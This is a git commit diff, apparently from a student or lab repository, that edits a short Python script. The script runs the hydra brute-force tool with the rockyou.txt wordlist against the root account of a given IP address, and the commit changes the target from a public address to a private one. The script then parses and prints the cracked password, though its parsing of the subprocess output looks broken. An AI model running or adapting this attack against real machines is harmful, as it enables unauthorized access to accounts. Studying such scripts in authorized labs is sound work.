4c0309d1ca52337d530091092493a5bf4de6f4b7
Ding Zhang <dzhang55@illinois.edu>
2019-02-24 03:02:47 -0600

    test

--- test.py
+++ test.py
@@ -1,4 +1,4 @@
-output = subprocess.Popen(["hydra -l root -P rockyou.txt -t 4 72.36.89.214"], stdout = PIPE)
+output = subprocess.Popen(["hydra -l root -P rockyou.txt -t 4 10.142.0.3"], stdout = PIPE)
 response = output.communicate()
 password = response.split("password: ", 1)[1]
 print("password is "+ password)
